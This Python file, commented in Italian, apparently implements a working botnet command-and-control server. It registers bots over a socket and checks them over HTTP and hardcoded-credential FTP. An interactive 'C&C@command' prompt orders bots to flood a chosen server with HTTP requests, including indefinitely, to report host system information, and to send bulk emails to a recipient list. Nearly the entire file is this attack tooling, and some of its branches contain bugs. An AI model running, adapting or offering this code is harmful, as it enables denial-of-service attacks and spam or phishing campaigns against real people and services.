import concurrent.futures
import socket
import json
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from ftplib import FTP
from time import sleep

import requests


class CC:
    # lista dei bot attivi con le relative porte
    activeBotSM = True
    activeBot = {}

    # costruttore
    def __init__(self):
        self.loadData()

    # aggiunge un bot alle liste
    def addBot(self, ip, data):
        while (not self.activeBotSM):
            continue
        self.activeBotSM = False
        self.activeBot[ip] = json.loads(data)
        self.activeBotSM = True
        return True

    # imposta lo stato di attività del bot
    def listen(self, event):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 49171))
            s.settimeout(2)
            print("Server is listening...")
            while True and (not event.is_set()):
                try:
                    s.listen()
                    res = True
                    conn, addr = s.accept()
                    data = conn.recv(1024).decode()
                    data = data.split(" ")
                    res = self.addBot(data[0], data[1])
                    if res:
                        data = "bot registrated succesfully"
                        conn.send(data.encode())
                    else:
                        data = "bot not registrated"
                        conn.send(data.encode())
                    conn.close()
                except Exception as e:
                    continue
        except Exception as e:
            print("\nListening errors:", e)
            return
        finally:
            conn.close()
            s.close()

    def checkBot(self):
        print("Controllo bot attivi...")
        rm = []
        for k, v in self.activeBot.items():
            http = True
            ftp = True
            try:
                url = "http://" + k + ":" + str(v['http']) + "/status"
                response = requests.get(url, timeout=10)
                res = response.json()
            except Exception as e:
                print(k, " is not reachable over http port.")
                del self.activeBot[k]['http']
            try:
                url = k,":",str(v['ftp'])
                ftp = FTP()
                ftp.connect(k,v['ftp'], timeout=10)
                ftp.login("CC","Sicurezza")
                ftp.close()
            except Exception as e:
                print(k, " is not reachable over ftp port.")
                del self.activeBot[k]['ftp']
            if len(self.activeBot[k]) == 2:
                del self.activeBot[k]
        print("Controllo terminato")

    def makeHTTPRequest(self, server, time=1, target=""):
        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/doGet"
                    response = requests.post(url, json={"url": server, "time":time}, timeout=10)
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
                response = requests.post(url, json={"url": server, "time": time}, timeout=10)
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        print("Richiesta inviata")

    def stopAttack(self, target=""):
        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/stopAttack"
                    response = requests.get(url, timeout=10)
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/stopAttack"
                response = requests.get(url, timeout=10)
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        print("Richiesta inviata")

    def getSystemInfo(self, target=""):
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/getSystemInfo"
                    response = requests.get(url)
                    res = response.json()
                    print("\t-----System info about", k, "-----")
                    for j,z in res.items():
                        if len(j) <= 6:
                            print("\t" + j + ":\t\t\t", z)
                        else:
                            print("\t" + j + ":\t\t", z)
                except Exception as e:
                    print(e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/getSystemInfo"
                response = requests.get(url)
                res = response.json()
                print("\t-----System info about", target, "-----")
                for j, z in res.items():
                    if len(j) <= 6:
                        print("\t" + j + ":\t\t\t", z)
                    else:
                        print("\t" + j + ":\t\t", z)
            except Exception as e:
                print(e)

    def sendEmail(self, target=""):
        users = None
        oggetto = None
        messaggio = None

        try:
            with open("email.json", 'r') as f:
                res = json.load(f)
                users = res["utenti"]
                oggetto = res["oggetto"]
                messaggio = res["messaggio"]
        except Exception as e:
            print("File error:",e)


        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/sendEmail"
                    response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print("Impossibile inviare la richiesta a", k, e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/sendEmail"
                response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        print("Richiesta inviata")

    def command(self, event):
        sleep(1)
        while (True):
            comando = input("C&C@command: ")
            #Ferma il server
            if comando == "stop":
                event.set()
                return
            #Mostra la lista di tutti i bot attivi
            elif comando == "ls":
                print("Ip\t\thttp\t\tftp")
                for k, v in self.activeBot.items():
                    print(f"{k}\t{v['http']}\t\t{v['ftp']}")
            #Mostra la lista di tutti i bot attivi ed il relativo stato
            elif comando == "ls -s":
                print("Ip\t\thttp\t\tftp\t\ttarget\t\t\t\taction")
                for k, v in self.activeBot.items():
                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['target']}\t\t{v['action']}")
            #Comando per eseguire un'attacco http ad un determinato server
            elif comando.startswith("get"):
                c = comando.split(" ")
                if len(c) == 1 or len(c) == 2:
                    print("Command not found")
                if c[3] == "all":
                    self.makeHTTPRequest(c[1], time=c[2])
                elif c[3] in self.activeBot:
                    self.makeHTTPRequest(c[1], time=c[2], target=c[3])
                else:
                    print("Command not found. Correct command [get [server] [time(int)(-1 for infinite attack)] [all | target(ip)]]")
            #Comando per fermare tutti gli attacchi
            elif comando.startswith("stop"):
                c = comando.split(" ")
                if len(c) == 1:
                    print("Command not found")
                if c[1] == "all":
                    self.stopAttack()
                elif c[1] in self.activeBot:
                    self.makeHTTPRequest(target=c[1])
                else:
                    print("Command not found. Correct command [stop [all | target(ip)]]")
            #Comando per acquisire informazioni sul sistema che ospita il bot
            elif comando.startswith("info"):
                c = comando.split(" ")
                if len(c) == 1 :
                    print("Command not found. Correct command [info [all | target(ip)]]")
                elif c[1] == "all":
                    self.getSystemInfo()
                else:
                    if c[1] in self.activeBot:
                        self.getSystemInfo(target=c[1])
                    else:
                        print("Command not found. Correct command [info [all | target(ip)]]")
            #Comando per mandare email
            elif comando.startswith("send"):
                c = comando.split(" ")
                if len(c) < 2:
                    print("Command not found")
                if c[1] == "all":
                    self.sendEmail()
                elif c[1] in self.activeBot:
                    self.sendEmail(target=c[2])
                else:
                    print(
                        "Command not found. Correct command [send [users (fileName)] [all | target(ip)]]")
            #Comando per verificare la raggiungibilità dei bot
            elif comando.startswith("ck"):
                c = comando.split(" ")
                if len(c) == 1:
                    print("Command not found")
                if c[1] == "all":
                    self.checkBot()
                elif c[1] in self.activeBot:
                    self.checkBot(target=c[1])
                else:
                    print("Command not found. Correct command [ck [all | target(ip)]]")
            else:
                print("Command not found")
                continue
    # load activeBot from file

    def loadData(self):
        with open("./activeBot.json", 'r') as f:
            self.activeBot = json.load(f)

    # write activeBot on file
    def writeData(self):
        with open("./activeBot.json", 'w') as f:
            json.dump(self.activeBot, f, indent=2)


# avvia il C&C
def startCC():
    print("Starting C&C...")
    cc = CC()
    event = Event()
    task = []
    with ThreadPoolExecutor(max_workers=2) as exec:
        task.append(exec.submit(cc.listen, event))
        task.append(exec.submit(cc.command, event))
        done, not_done = concurrent.futures.wait(task, return_when=concurrent.futures.FIRST_COMPLETED)
        exec.shutdown(wait=False)
    cc.writeData()
    print("C&C stopped")
    return


if __name__ == "__main__":
    startCC()
